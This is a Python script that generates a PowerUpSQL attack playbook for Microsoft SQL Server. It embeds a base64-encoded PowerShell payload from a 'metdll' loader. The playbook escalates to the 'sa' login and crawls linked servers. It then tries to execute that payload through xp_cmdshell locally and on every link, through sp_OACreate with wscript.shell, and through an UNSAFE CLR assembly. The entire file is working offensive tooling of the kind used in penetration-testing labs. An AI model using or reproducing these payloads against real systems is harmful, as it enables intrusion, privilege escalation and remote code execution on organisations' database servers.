#!/bin/env python3
import ak
from generate_tool_loader import ToolLoader
from generate_win_util_SQLAssembly import SQLAssembly

tl = ToolLoader("metdll")

b64_shell = tl.ps_b64() 

s = SQLAssembly("tmp")
sql_assembly = "0x" + s.get_hex()
s.cleanup()

o = f"""
$c="powershell -enc {b64_shell}"

Write-Output "Running as user:"
$q="SELECT USER_NAME()";Get-SQLQuery -Query "$q"
$q="SELECT SYSTEM_USER";Get-SQLQuery -Query "$q"

Write-Output "Impersonateable users"
$q="SELECT distinct b.name FROM master.sys.server_permissions a INNER JOIN master.sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";Get-SQLQuery -Query "$q"

Write-Output "Checking if user public"
$q="SELECT IS_SRVROLEMEMBER('public')";get-sqlquery -verbose -query "$q"

Write-Output "Checking if user a sysadmin"
$q="SELECT IS_SRVROLEMEMBER('sysadmin')";get-sqlquery -verbose -query "$q"

Write-Output "Attempting to escalate to sa user"
$q="EXECUTE AS LOGIN = 'sa'";Get-SQLQuery -Verbose -Query "$q"

Write-Output "List of server links"
Get-SqlServerLinkCrawl -Query "exec sp_linkedservers;"

Write-Output "Trying XP_CMDSHELL on local server"
get-SqlQuery -verbose -query "exec master.dbo.xp_cmdshell '$c'"

Write-Output "Trying XP_CMDSHELL on all links with AT syntax"
$r = Get-SqlServerLinkCrawl -Query "SELECT USER_NAME";$r.links | Foreach-Object {{ Get-SQLQuery -Verbose -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT `"$_`";EXECUTE ('master.dbo.xp_cmdshell ''$c''') AT `"$_`"" }}

Write-Output "Trying XP_CMDSHELL on all links with OpenQuery syntax"
$r = Get-SqlServerLinkCrawl -Query "SELECT USER_NAME";$r.links | Foreach-Object {{ Get-SQLQuery -Verbose -Query "select 1 from openquery(`"$_`", 'select 1; EXEC sp_configure ''xp_cmdshell'',1,RECONFIGURE')"  }}
$r = Get-SqlServerLinkCrawl -Query "SELECT USER_NAME";$r.links | Foreach-Object {{ Get-SQLQuery -Verbose -Query "select 1 from openquery(`"$_`", 'select 1; EXEC xp_cmdshell   ''$c'' ')"  }}

Write-Output "Trying sp_OACreate locally"
$q="EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c `"$c`"';";get-sqlquery -query "$q"

Write-Output "Trying sp_OACreate w/ OpenQuery on links"
$a="select 1; EXEC sp_configure ''show advanced options'',1,RECONFIGURE;"
$a+="EXEC sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;"
$a+="DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''cmd /c `"$c`"''"
$r = Get-SqlServerLinkCrawl -Query "SELECT USER_NAME";$r.links | Foreach-Object {{ Get-SQLQuery -Verbose -Query "select 1 from openquery(`"$_`", '$a')"  }}

Write-Output "Trying custom assemblies locally"
$q="use msdb;EXECUTE AS USER='dbo';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security',0;RECONFIGURE;";get-sqlquery -verbose -query "$q"
$q="CREATE ASSEMBLY my_assembly FROM {sql_assembly} WITH PERMISSION_SET = UNSAFE;";get-sqlquery -verbose -query "$q"
$q="CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";get-sqlquery -verbose -query "$q"
$q="EXEC cmdExec '$c'";get-sqlquery -verbose -query "$q"

Write-Output "Trying custom assemblies on linked instances"

"""

ak.write_file("output_powerupsql.txt", o)
